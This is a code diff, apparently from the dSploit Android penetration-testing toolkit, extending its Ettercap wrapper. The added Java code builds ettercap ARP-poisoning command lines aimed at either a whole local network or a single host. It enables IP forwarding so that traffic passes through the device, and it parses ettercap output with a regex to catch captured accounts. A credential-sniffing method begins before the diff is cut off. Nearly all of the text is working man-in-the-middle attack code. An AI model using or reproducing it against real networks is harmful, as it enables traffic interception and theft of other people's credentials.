@@ -18,6 +18,9 @@
  */
 package it.evilsocket.dsploit.tools;
 
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
 import it.evilsocket.dsploit.core.System;
 import it.evilsocket.dsploit.core.Shell.OutputReceiver;
 import it.evilsocket.dsploit.net.Target;
@@ -55,6 +58,67 @@ public class Ettercap extends Tool
 	}
 	
 	public Thread spoof( Target target, OnReadyListener listener ) {
+		String commandLine;
+
+		// poison the entire network
+		if( target.getType() == Target.Type.NETWORK )
+			commandLine = "// //";
+		// router -> target poison
+		else
+			commandLine = "/" + target.getCommandLineRepresentation() + "/ //"; 
+		
+		try
+		{
+			commandLine = "-Tq -M arp:remote -i " + System.getNetwork().getInterface().getDisplayName() + " " + commandLine;
+		}
+		catch( Exception e )
+		{
+			System.errorLogging( TAG, e );
+		}
+		
+		return super.async( commandLine, listener );
+	}
+	
+	public static abstract class OnAccountListener implements OutputReceiver
+	{
+		private static final Pattern ACCOUNT_PATTERN  = Pattern.compile( "^([^\\s]+)\\s+:\\s+([^\\:]+):(\\d+).+", Pattern.CASE_INSENSITIVE );
+		
+		@Override
+		public void onStart(String command) {
+			
+		}
+
+		@Override
+		public void onNewLine(String line) {	
+			// when ettercap is ready, enable ip forwarding
+			if( line.toLowerCase().contains("for inline help") )
+			{
+				System.setForwarding( true );
+			}
+			else
+			{
+				Matcher matcher = ACCOUNT_PATTERN.matcher( line );
+				
+				if( matcher != null && matcher.find() )
+				{
+					String protocol = matcher.group( 1 ),
+						   address  = matcher.group( 2 ),
+						   port		= matcher.group( 3 );
+					
+					onAccount( protocol, address, port, line );
+				}
+			}
+		}
+
+		@Override
+		public void onEnd(int exitCode) {
+			
+		}
+		
+		public abstract void onAccount( String protocol, String address, String port, String line );
+	}
+	
+	public Thread spoofPasswords( Target target, OnAccountListener listener ) {
 		String commandLine;
 
 		// poison the entire network
